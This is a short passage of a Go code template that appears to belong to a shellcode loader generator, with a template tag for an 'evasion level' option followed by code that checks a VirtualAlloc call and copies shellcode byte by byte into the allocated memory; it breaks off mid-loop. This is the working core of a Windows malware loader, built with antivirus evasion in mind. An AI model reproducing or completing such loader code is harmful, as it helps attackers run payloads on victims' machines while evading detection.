{{/ifEvasionLevel}}

	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %v", err)
	}

	// Copy shellcode to allocated memory
	for i := 0; i < size; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
